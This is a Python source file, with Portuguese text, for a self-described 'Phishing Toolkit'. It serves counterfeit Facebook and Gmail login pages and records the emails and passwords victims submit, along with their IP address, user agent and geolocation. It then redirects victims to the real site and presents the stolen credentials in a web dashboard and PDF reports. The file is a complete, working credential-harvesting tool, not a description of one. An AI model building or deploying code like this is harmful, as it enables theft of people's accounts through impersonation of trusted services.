import os
import sqlite3
from fpdf import FPDF
import requests
import http.server
import socketserver
import threading
import time
import sys
import socket
import uuid
import datetime
from urllib.parse import parse_qs
import http.cookies
import json

def get_geolocation(ip):
    """Obtém dados de geolocalização para um endereço IP"""
    try:
        if ip in ['127.0.0.1', 'localhost']:
            return {'city': 'Local', 'region': 'Local', 'country': 'Local'}
        
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,query', timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            return {
                'ip': data.get('query', ip),
                'country': data.get('country', 'Desconhecido'),
                'region': data.get('regionName', 'Desconhecido'),
                'city': data.get('city', 'Desconhecido'),
                'isp': data.get('isp', 'Desconhecido'),
                'org': data.get('org', 'Desconhecido'),
                'mobile': data.get('mobile', False),
                'proxy': data.get('proxy', False),
                'hosting': data.get('hosting', False)
            }
        return {'ip': ip, 'error': data.get('message', 'Erro desconhecido')}
    except Exception as e:
        return {'ip': ip, 'error': str(e)}

def initialize_database():
    """Inicializa o banco de dados SQLite com verificação de esquema"""
    conn = None
    try:
        conn = sqlite3.connect('db.sqlite')
        cursor = conn.cursor()
        
        # Criar tabelas se não existirem
        cursor.execute('''CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            url TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )''')
        
        cursor.execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            data TEXT,
            success BOOLEAN,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )''')
        
        cursor.execute('''CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            email TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            token TEXT,
            geolocation TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )''')
        
        cursor.execute('''CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            ip TEXT,
            user_agent TEXT,
            token TEXT,
            geolocation TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (target_id) REFERENCES targets(id)
        )''')

        # Verificar e adicionar colunas faltantes
        def add_column_if_not_exists(table, column, col_type):
            cursor.execute(f"PRAGMA table_info({table})")
            columns = [info[1] for info in cursor.fetchall()]
            if column not in columns:
                print(f"✅ Adicionando coluna {column} à tabela {table}")
                cursor.execute(f"ALTER TABLE {table} ADD COLUMN {column} {col_type}")

        # Verificar todas as colunas necessárias
        add_column_if_not_exists('clicks', 'geolocation', 'TEXT')
        add_column_if_not_exists('credentials', 'geolocation', 'TEXT')
        
        conn.commit()
        print("✅ Banco de dados inicializado e verificado com sucesso")
    except sqlite3.Error as e:
        print(f"❌ Erro crítico no banco de dados: {str(e)}")
        sys.exit(1)
    finally:
        if conn:
            conn.close()

def generate_report():
    """Gera um relatório completo em PDF com os dados coletados"""
    try:
        conn = sqlite3.connect('db.sqlite')
        cursor = conn.cursor()
        
        # Criar PDF
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", 'B', 16)
        
        # Título do relatório
        pdf.cell(0, 10, "Relatório Phishing Toolkit", 0, 1, 'C')
        pdf.ln(10)
        
        # Data de geração
        pdf.set_font("Arial", '', 12)
        pdf.cell(0, 10, f"Gerado em: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 0, 1)
        pdf.ln(5)
        
        # Seção de estatísticas
        pdf.set_font("Arial", 'B', 14)
        pdf.cell(0, 10, "Estatísticas Gerais", 0, 1)
        pdf.set_font("Arial", '', 12)
        
        # Obter estatísticas
        def get_count(query):
            cursor.execute(query)
            result = cursor.fetchone()
            return result[0] if result else 0
        
        targets_count = get_count("SELECT COUNT(*) FROM targets")
        clicks_count = get_count("SELECT COUNT(*) FROM clicks")
        creds_count = get_count("SELECT COUNT(*) FROM credentials")
        success_rate = get_count("SELECT (COUNT(*) * 100.0 / (SELECT COUNT(*) FROM results)) FROM results WHERE success = 1") if get_count("SELECT COUNT(*) FROM results") > 0 else 0
        
        pdf.cell(0, 10, f"Total de Targets: {targets_count}", 0, 1)
        pdf.cell(0, 10, f"Total de Cliques: {clicks_count}", 0, 1)
        pdf.cell(0, 10, f"Credenciais Capturadas: {creds_count}", 0, 1)
        pdf.cell(0, 10, f"Taxa de Sucesso: {success_rate:.2f}%", 0, 1)
        pdf.ln(10)
        
        # Seção de Targets
        pdf.set_font("Arial", 'B', 14)
        pdf.cell(0, 10, "Targets Registrados", 0, 1)
        pdf.set_font("Arial", '', 10)
        
        cursor.execute("SELECT id, email, url, timestamp FROM targets ORDER BY timestamp DESC")
        targets = cursor.fetchall()
        
        if targets:
            col_widths = [15, 60, 80, 30]
            pdf.set_fill_color(200, 220, 255)
            
            # Cabeçalho da tabela
            headers = ["ID", "Email", "URL", "Data"]
            for i, header in enumerate(headers):
                pdf.cell(col_widths[i], 10, header, 1, 0, 'C', 1)
            pdf.ln()
            
            # Linhas da tabela
            fill = False
            for target in targets:
                pdf.set_fill_color(230, 230, 230) if fill else pdf.set_fill_color(255, 255, 255)
                for i, item in enumerate(target):
                    pdf.cell(col_widths[i], 10, str(item), 1, 0, 'L', fill)
                pdf.ln()
                fill = not fill
        else:
            pdf.cell(0, 10, "Nenhum target registrado", 0, 1)
        
        pdf.ln(10)
        
        # Seção de Credenciais
        pdf.set_font("Arial", 'B', 14)
        pdf.cell(0, 10, "Últimas Credenciais Capturadas", 0, 1)
        pdf.set_font("Arial", '', 10)
        
        cursor.execute("SELECT id, email, password, ip, timestamp FROM credentials ORDER BY timestamp DESC LIMIT 15")
        credentials = cursor.fetchall()
        
        if credentials:
            col_widths = [15, 60, 40, 40, 30]
            pdf.set_fill_color(200, 220, 255)
            
            # Cabeçalho da tabela
            headers = ["ID", "Email", "Senha", "IP", "Data"]
            for i, header in enumerate(headers):
                pdf.cell(col_widths[i], 10, header, 1, 0, 'C', 1)
            pdf.ln()
            
            # Linhas da tabela
            fill = False
            for cred in credentials:
                pdf.set_fill_color(230, 230, 230) if fill else pdf.set_fill_color(255, 255, 255)
                for i, item in enumerate(cred):
                    pdf.cell(col_widths[i], 10, str(item), 1, 0, 'L', fill)
                pdf.ln()
                fill = not fill
        else:
            pdf.cell(0, 10, "Nenhuma credencial capturada", 0, 1)
        
        pdf.ln(10)
        
        # Seção de Geolocalização
        pdf.set_font("Arial", 'B', 14)
        pdf.cell(0, 10, "Distribuição Geográfica", 0, 1)
        pdf.set_font("Arial", '', 10)
        
        cursor.execute("SELECT geolocation FROM credentials WHERE geolocation IS NOT NULL")
        geo_data = [json.loads(row[0]) for row in cursor.fetchall() if row[0]]
        
        if geo_data:
            countries = {}
            cities = {}
            
            for geo in geo_data:
                country = geo.get('country', 'Desconhecido')
                city = geo.get('city', 'Desconhecido')
                
                countries[country] = countries.get(country, 0) + 1
                cities[city] = cities.get(city, 0) + 1
            
            # Países
            pdf.cell(0, 10, "Países (Top 5):", 0, 1)
            for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]:
                pdf.cell(0, 10, f"- {country}: {count} ocorrências", 0, 1)
            
            pdf.ln(5)
            
            # Cidades
            pdf.cell(0, 10, "Cidades (Top 5):", 0, 1)
            for city, count in sorted(cities.items(), key=lambda x: x[1], reverse=True)[:5]:
                pdf.cell(0, 10, f"- {city}: {count} ocorrências", 0, 1)
        else:
            pdf.cell(0, 10, "Nenhum dado de geolocalização disponível", 0, 1)
        
        # Salvar o PDF
        report_dir = "reports"
        os.makedirs(report_dir, exist_ok=True)
        report_path = os.path.join(report_dir, f"report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
        pdf.output(report_path)
        
        print(f"\n✅ Relatório gerado com sucesso: {report_path}")
    except sqlite3.Error as e:
        print(f"❌ Erro ao acessar o banco de dados: {str(e)}")
    except Exception as e:
        print(f"❌ Erro ao gerar relatório: {str(e)}")
    finally:
        if conn:
            conn.close()

def main_menu():
    """Menu principal da ferramenta"""
    initialize_database()
    
    while True:
        print("\n=== Phishing Toolkit ===")
        print("1. Adicionar novo target")
        print("2. Executar simulação")
        print("3. Gerar relatório")
        print("4. Iniciar servidor de phishing")
        print("5. Ver credenciais capturadas")
        print("6. Iniciar dashboard de rastreamento")
        print("7. Sair")
        
        choice = input("Escolha uma opção: ").strip()
        
        if choice == "1":
            email = input("Email do target: ").strip()
            url = input("URL de phishing: ").strip()
            if email and url:
                add_target(email, url)
            else:
                print("❌ Email e URL são obrigatórios!")
            
        elif choice == "2":
            run_simulation()
            
        elif choice == "3":
            generate_report()
            
        elif choice == "4":
            start_phishing_server()
            
        elif choice == "5":
            show_credentials()
            
        elif choice == "6":
            start_tracking_dashboard()
            
        elif choice == "7":
            print("Saindo...")
            break
            
        else:
            print("❌ Opção inválida!")

def add_target(email, url):
    """Adiciona novo target ao banco de dados"""
    conn = None
    try:
        conn = sqlite3.connect('db.sqlite')
        cursor = conn.cursor()
        cursor.execute("INSERT INTO targets (email, url) VALUES (?, ?)", (email, url))
        conn.commit()
        print(f"✅ Target adicionado: {email}")
    except sqlite3.Error as e:
        print(f"❌ Erro ao adicionar target: {str(e)}")
    finally:
        if conn:
            conn.close()

def run_simulation():
    """Simula envio de phishing"""
    conn = None
    try:
        conn = sqlite3.connect('db.sqlite')
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM targets")
        count = cursor.fetchone()[0]
        
        if count == 0:
            print("❌ Nenhum target registrado! Adicione targets primeiro.")
            return
        
        cursor.execute("SELECT id, email, url FROM targets")
        targets = cursor.fetchall()
        
        for target in targets:
            target_id, email, url = target
            print(f"\nEnviando para: {email}")
            print(f"URL: {url}")
            
            try:
                response = requests.get(url, timeout=10)
                success = response.status_code == 200
                
                cursor.execute(
                    "INSERT INTO results (target_id, data, success) VALUES (?, ?, ?)",
                    (target_id, f"Status: {response.status_code}", success)
                )
                status = "✅ Sucesso" if success else "❌ Falha"
                print(f"Resultado: {status} (Status: {response.status_code})")
                
            except Exception as e:
                cursor.execute(
                    "INSERT INTO results (target_id, data, success) VALUES (?, ?, ?)",
                    (target_id, f"Erro: {str(e)}", False)
                )
                print(f"❌ Erro: {str(e)}")
        
        conn.commit()
        print("\n✅ Simulação concluída!")
    except sqlite3.Error as e:
        print(f"❌ Erro no banco de dados: {str(e)}")
    except Exception as e:
        print(f"❌ Erro geral: {str(e)}")
    finally:
        if conn:
            conn.close()

def is_port_available(port):
    """Verifica se uma porta está disponível"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("", port))
            s.close()
            return True
        except OSError:
            return False

def generate_template(service):
    """Gera template HTML para diferentes serviços"""
    templates = {
        "facebook": {
            "title": "Facebook - Faça login ou cadastre-se",
            "logo": "https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg",
            "form": """
            <form action="/login" method="post">
                <div class="form-group">
                    <input type="text" class="form-control" name="email" placeholder="Email ou telefone" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-control" name="password" placeholder="Senha" required>
                </div>
                <button type="submit" class="btn-login">Entrar</button>
                <div class="links">
                    <a href="#">Esqueceu a senha?</a>
                    <a href="#">Criar nova conta</a>
                </div>
            </form>
            """,
            "styles": """
            body { background-color: #f0f2f5; font-family: Arial, sans-serif; }
            .container { max-width: 400px; margin: 100px auto; padding: 20px; }
            .logo { text-align: center; margin-bottom: 20px; }
            .logo img { height: 70px; }
            .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .form-group { margin-bottom: 15px; }
            .form-control { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
            .btn-login { background-color: #1877f2; color: white; width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
            .btn-login:hover { background-color: #166fe5; }
            .links { text-align: center; margin-top: 20px; }
            .links a { color: #1877f2; text-decoration: none; margin: 0 10px; }
            .links a:hover { text-decoration: underline; }
            """
        },
        "gmail": {
            "title": "Fazer login no Gmail",
            "logo": "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png",
            "form": """
            <form action="/login" method="post">
                <div class="form-group">
                    <input type="email" class="form-control" name="email" placeholder="E-mail" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-control" name="password" placeholder="Digite sua senha" required>
                </div>
                <div class="options">
                    <label><input type="checkbox" name="remember"> Manter-me conectado</label>
                    <a href="#">Esqueceu a senha?</a>
                </div>
                <button type="submit" class="btn-login">Próxima</button>
            </form>
            """,
            "styles": """
            body { background-color: white; font-family: Arial, sans-serif; }
            .container { max-width: 450px; margin: 100px auto; padding: 20px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo img { height: 40px; }
            .card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; }
            .form-group { margin-bottom: 20px; }
            .form-control { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
            .btn-login { background-color: #1a73e8; color: white; width: 100%; padding: 12px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
            .btn-login:hover { background-color: #1765cc; }
            .options { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 14px; }
            .options a { color: #1a73e8; text-decoration: none; }
            .options a:hover { text-decoration: underline; }
            """
        }
    }
    
    service_data = templates.get(service, templates["facebook"])
    return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{service_data['title']}</title>
    <style>{service_data['styles']}</style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{service_data['logo']}" alt="Logo">
        </div>
        <div class="card">
            {service_data['form']}
        </div>
    </div>
</body>
</html>"""

def start_phishing_server():
    """Inicia servidor de phishing com rastreamento"""
    SITE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "phishing_site")
    os.makedirs(SITE_DIR, exist_ok=True)

    print("\nEscolha o serviço para phishing:")
    print("1. Facebook")
    print("2. Gmail")
    service_choice = input("Opção (1/2): ").strip()
    service = "facebook" if service_choice == "1" else "gmail"

    # Gerar template
    with open(os.path.join(SITE_DIR, "index.html"), "w", encoding="utf-8") as f:
        f.write(generate_template(service))

    class PhishingHandler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=SITE_DIR, **kwargs)
        
        def _set_headers(self, status=200, content_type='text/html'):
            self.send_response(status)
            self.send_header('Content-type', f'{content_type}; charset=utf-8')
            self.end_headers()
        
        def do_GET(self):
            if self.path == '/':
                # Registrar clique
                ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Desconhecido')
                token = str(uuid.uuid4())
                geo_data = get_geolocation(ip)
                
                conn = sqlite3.connect('db.sqlite')
                cursor = conn.cursor()
                cursor.execute("SELECT id FROM targets ORDER BY id DESC LIMIT 1")
                result = cursor.fetchone()
                target_id = result[0] if result else None
                
                cursor.execute(
                    "INSERT INTO clicks (target_id, ip, user_agent, token, geolocation) VALUES (?, ?, ?, ?, ?)",
                    (target_id, ip, user_agent, token, json.dumps(geo_data))
                )
                conn.commit()
                conn.close()
                
                # Setar cookie e servir página
                self._set_headers()
                self.send_header('Set-Cookie', f'tracking_token={token}; Path=/')
                
                # Ler e servir o arquivo HTML
                try:
                    with open(os.path.join(SITE_DIR, "index.html"), 'rb') as f:
                        self.wfile.write(f.read())
                except FileNotFoundError:
                    self.send_error(404, "File not found")
            elif self.path == '/success.html':
                # Servir a página de sucesso diretamente
                self._set_headers()
                success_page = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Login Bem-Sucedido</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }}
        .success-box {{
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }}
        .success-icon {{
            color: #4CAF50;
            font-size: 50px;
            margin-bottom: 20px;
        }}
        .success-message {{
            color: #4CAF50;
            font-size: 24px;
            margin-bottom: 20px;
        }}
        .redirect-message {{
            color: #666;
            margin-top: 30px;
        }}
    </style>
</head>
<body>
    <div class="success-box">
        <div class="success-icon">✓</div>
        <div class="success-message">✅ Login realizado com sucesso!</div>
        <p>Obrigado por acessar nosso serviço.</p>
        <div class="redirect-message">
            Você será redirecionado em instantes...
        </div>
    </div>
    <script>
        setTimeout(function() {{
            window.location.href = 'https://www.{service}.com';
        }}, 3000);
    </script>
</body>
</html>"""
                self.wfile.write(success_page.encode('utf-8'))
            else:
                self.send_error(404, "File not found")
        
        def do_POST(self):
            if self.path == '/login':
                try:
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    data = parse_qs(post_data)
                    
                    ip = self.client_address[0]
                    user_agent = self.headers.get('User-Agent', 'Desconhecido')
                    token = None
                    geo_data = get_geolocation(ip)
                    
                    if 'Cookie' in self.headers:
                        cookies = http.cookies.SimpleCookie(self.headers['Cookie'])
                        if 'tracking_token' in cookies:
                            token = cookies['tracking_token'].value
                    
                    email = data.get('email', [''])[0]
                    password = data.get('password', [''])[0]
                    
                    print(f"\n[!] Credenciais capturadas - Email: {email} | Senha: {password}")
                    print(f"[!] IP: {ip} | Localização: {geo_data.get('city', '?')}, {geo_data.get('country', '?')}")
                    print(f"[!] User-Agent: {user_agent[:50]}... | Token: {token}")
                    
                    # Salvar no banco
                    conn = sqlite3.connect('db.sqlite')
                    cursor = conn.cursor()
                    cursor.execute("SELECT id FROM targets ORDER BY id DESC LIMIT 1")
                    result = cursor.fetchone()
                    target_id = result[0] if result else None
                    
                    cursor.execute(
                        "INSERT INTO credentials (target_id, email, password, ip, user_agent, token, geolocation) VALUES (?, ?, ?, ?, ?, ?, ?)",
                        (target_id, email, password, ip, user_agent, token, json.dumps(geo_data))
                    )
                    conn.commit()
                    conn.close()
                    
                    # Redirecionar para página de sucesso
                    self._set_headers(302)
                    self.send_header('Location', '/success.html')
                    self.end_headers()
                except Exception as e:
                    print(f"[ERROR] em do_POST: {str(e)}")
                    self.send_error(500, f"Internal Server Error: {str(e)}")
            else:
                self.send_error(404, "Not Found")

    def run_server(port):
        try:
            with socketserver.TCPServer(("", port), PhishingHandler) as httpd:
                print(f"\n✅ Servidor de phishing rodando em http://localhost:{port}")
                print(f"🔒 Página de login: {service.capitalize()}")
                print("🛑 Pressione Ctrl+C para parar o servidor")
                httpd.serve_forever()
        except OSError as e:
            print(f"❌ Erro ao iniciar servidor: {str(e)}")
        except Exception as e:
            print(f"❌ Erro inesperado: {str(e)}")

    # Seleção de porta
    print("\n[?] Escolha uma porta (padrão: 8000) ou digite 'auto' para seleção automática:")
    port_input = input("Porta: ").strip().lower()
    
    if port_input == 'auto':
        port = 8000
        max_attempts = 20
        for i in range(max_attempts):
            if is_port_available(port + i):
                port += i
                break
        else:
            print("❌ Não foi possível encontrar porta disponível automaticamente")
            port = int(input("Por favor digite o número da porta manualmente: "))
    elif port_input.isdigit():
        port = int(port_input)
    else:
        port = 8000
    
    if not is_port_available(port):
        print(f"⚠️ Porta {port} está ocupada. Tentando portas seguintes...")
        for p in range(port + 1, port + 10):
            if is_port_available(p):
                port = p
                break
        else:
            print("❌ Não foi possível encontrar porta disponível")
            port = int(input("Por favor digite o número da porta manualmente: "))
    
    server_thread = threading.Thread(target=run_server, args=(port,), daemon=True)
    server_thread.start()
    
    try:
        # Verifica se o servidor está rodando
        time.sleep(1)
        if not server_thread.is_alive():
            print("\n❌ Falha ao iniciar servidor")
            return
        
        print(f"\n[!] Adicione um novo target com a URL: http://localhost:{port}")
        print("[!] Use a opção 1 do menu para adicionar\n")
        
        # Mantém o thread principal ativo enquanto o servidor estiver rodando
        while server_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Servidor parado")

def show_credentials():
    """Mostra credenciais capturadas com tratamento de erros"""
    conn = None
    try:
        conn = sqlite3.connect('db.sqlite')
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
        credentials = cursor.fetchall()
        
        if not credentials:
            print("\n❌ Nenhuma credencial capturada")
        else:
            print("\n=== Credenciais Capturadas ===")
            for cred in credentials:
                try:
                    geo = json.loads(cred[7]) if cred[7] else {}
                except json.JSONDecodeError:
                    geo = {}
                
                print(f"\nID: {cred[0] or 'N/A'} | Target: {cred[1] or 'N/A'}")
                print(f"Email: {cred[2] or 'N/A'} | Senha: {cred[3] or 'N/A'}")
                print(f"IP: {cred[4] or 'N/A'} | Token: {cred[6] or 'N/A'}")
                print(f"Localização: {geo.get('city', '?')}, {geo.get('region', '?')}, {geo.get('country', '?')}")
                print(f"Data: {cred[8] or 'N/A'}")
                print("-"*50)
    except sqlite3.Error as e:
        print(f"❌ Erro no banco de dados: {str(e)}")
    except Exception as e:
        print(f"❌ Erro inesperado: {str(e)}")
    finally:
        if conn:
            conn.close()

def start_tracking_dashboard():
    """Inicia dashboard de rastreamento com tratamento robusto de erros"""
    PORT = 5000

    class DashboardHandler(http.server.BaseHTTPRequestHandler):
        def _set_headers(self, content_type='text/html; charset=utf-8', status=200):
            self.send_response(status)
            self.send_header('Content-type', content_type)
            self.end_headers()
        
        def do_GET(self):
            if self.path == '/':
                try:
                    conn = sqlite3.connect('db.sqlite')
                    cursor = conn.cursor()
                    
                    # Função para carregar JSON seguro
                    def safe_json_loads(json_str):
                        if not json_str:
                            return {}
                        try:
                            return json.loads(json_str)
                        except json.JSONDecodeError:
                            return {}

                    # Obter estatísticas
                    def get_count(query):
                        cursor.execute(query)
                        result = cursor.fetchone()
                        return result[0] if result and result[0] is not None else 0

                    targets_count = get_count("SELECT COUNT(*) FROM targets")
                    clicks_count = get_count("SELECT COUNT(*) FROM clicks")
                    creds_count = get_count("SELECT COUNT(*) FROM credentials")

                    # Gerar linhas da tabela
                    def generate_table_rows(query, geo_index, columns):
                        rows = ""
                        cursor.execute(query)
                        for row in cursor.fetchall():
                            geo = safe_json_loads(row[geo_index]) if geo_index < len(row) else {}
                            row_html = "<tr>"
                            for i, col in enumerate(columns):
                                value = row[i] if i < len(row) else 'N/A'
                                if isinstance(value, str) and col == 'user_agent':
                                    value = value[:50] + ('...' if len(value) > 50 else '')
                                row_html += f"<td>{value if value is not None else 'N/A'}</td>"
                            row_html += "</tr>"
                            rows += row_html
                        return rows

                    # Dados das tabelas
                    clicks_rows = generate_table_rows(
                        "SELECT id, target_id, ip, user_agent, token, geolocation, timestamp FROM clicks ORDER BY timestamp DESC LIMIT 5",
                        5, ['id', 'target_id', 'ip', 'user_agent', 'token', 'geo', 'timestamp']
                    )

                    creds_rows = generate_table_rows(
                        "SELECT id, target_id, email, password, ip, user_agent, token, geolocation, timestamp FROM credentials ORDER BY timestamp DESC LIMIT 5",
                        7, ['id', 'target_id', 'email', 'password', 'ip', 'user_agent', 'token', 'geo', 'timestamp']
                    )

                    targets_rows = generate_table_rows(
                        "SELECT id, email, url, timestamp FROM targets ORDER BY timestamp DESC",
                        -1, ['id', 'email', 'url', 'timestamp']
                    )

                    # HTML template
                    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Phishing Dashboard</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background-color: #333; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
        .stats {{ display: flex; justify-content: space-between; margin-bottom: 20px; }}
        .stat-card {{ background: white; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); width: 30%; text-align: center; }}
        .section {{ background: white; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 20px; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; position: sticky; top: 0; }}
        .ip {{ font-family: monospace; }}
        tr:hover {{ background-color: #f9f9f9; }}
        .timestamp {{ white-space: nowrap; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Phishing Toolkit Dashboard</h1>
            <p>Atualizado em: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Targets</h3>
                <p>{targets_count}</p>
            </div>
            <div class="stat-card">
                <h3>Cliques</h3>
                <p>{clicks_count}</p>
            </div>
            <div class="stat-card">
                <h3>Credenciais</h3>
                <p>{creds_count}</p>
            </div>
        </div>
        
        <div class="section">
            <h2>Últimos Cliques</h2>
            <div style="max-height: 300px; overflow-y: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Target ID</th>
                            <th>IP</th>
                            <th>User Agent</th>
                            <th>Token</th>
                            <th class="timestamp">Data/Hora</th>
                        </tr>
                    </thead>
                    <tbody>
                        {clicks_rows}
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="section">
            <h2>Últimas Credenciais</h2>
            <div style="max-height: 300px; overflow-y: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Target ID</th>
                            <th>Email</th>
                            <th>Senha</th>
                            <th>IP</th>
                            <th>Token</th>
                            <th class="timestamp">Data/Hora</th>
                        </tr>
                    </thead>
                    <tbody>
                        {creds_rows}
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="section">
            <h2>Targets Ativos</h2>
            <div style="max-height: 300px; overflow-y: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Email</th>
                            <th>URL</th>
                            <th class="timestamp">Data/Hora</th>
                        </tr>
                    </thead>
                    <tbody>
                        {targets_rows}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>"""
                    
                    self._set_headers()
                    self.wfile.write(html.encode('utf-8'))
                except sqlite3.Error as e:
                    self._set_headers(status=500)
                    self.wfile.write(f"<h1>Database Error</h1><p>{str(e)}</p>".encode('utf-8'))
                except Exception as e:
                    self._set_headers(status=500)
                    self.wfile.write(f"<h1>Internal Server Error</h1><p>{str(e)}</p>".encode('utf-8'))
                finally:
                    if 'conn' in locals() and conn:
                        conn.close()
            else:
                self._set_headers(status=404)
                self.wfile.write("<h1>Page Not Found</h1>".encode('utf-8'))
    
    try:
        if not is_port_available(PORT):
            print(f"❌ Port {PORT} is already in use. Try again later.")
            return
        
        print(f"\n🔄 Starting dashboard at http://localhost:{PORT}")
        print("🛑 Press Ctrl+C to stop")
        
        with socketserver.TCPServer(("", PORT), DashboardHandler) as httpd:
            httpd.serve_forever()
    except OSError as e:
        if e.errno == 98:
            print(f"❌ Port {PORT} is already in use. Options:")
            print(f"1. Close other programs using port {PORT}")
            print(f"2. Use a different port by modifying the PORT variable")
        else:
            print(f"❌ Server error: {str(e)}")
    except KeyboardInterrupt:
        print("\n🛑 Dashboard stopped by user")
    except Exception as e:
        print(f"❌ Unexpected error: {str(e)}")

if __name__ == "__main__":
    try:
        # Verificação de dependências
        import requests
        from fpdf import FPDF
        main_menu()
    except ImportError as e:
        print(f"❌ Erro: Módulo não encontrado - {str(e)}")
        print("Instale as dependências com: pip install requests fpdf")
    except KeyboardInterrupt:
        print("\n🛑 Programa encerrado pelo usuário")
    except Exception as e:
        print(f"❌ Erro inesperado: {str(e)}")
